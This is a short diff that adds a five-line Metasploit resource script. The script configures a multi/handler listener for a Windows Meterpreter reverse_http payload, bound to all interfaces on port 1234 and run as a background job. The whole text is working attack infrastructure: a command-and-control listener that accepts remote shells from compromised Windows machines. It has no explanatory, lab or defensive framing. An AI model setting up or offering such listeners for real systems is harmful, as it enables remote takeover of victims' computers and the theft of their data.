@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set lhost 0.0.0.0
+set lport 1234
+run -j
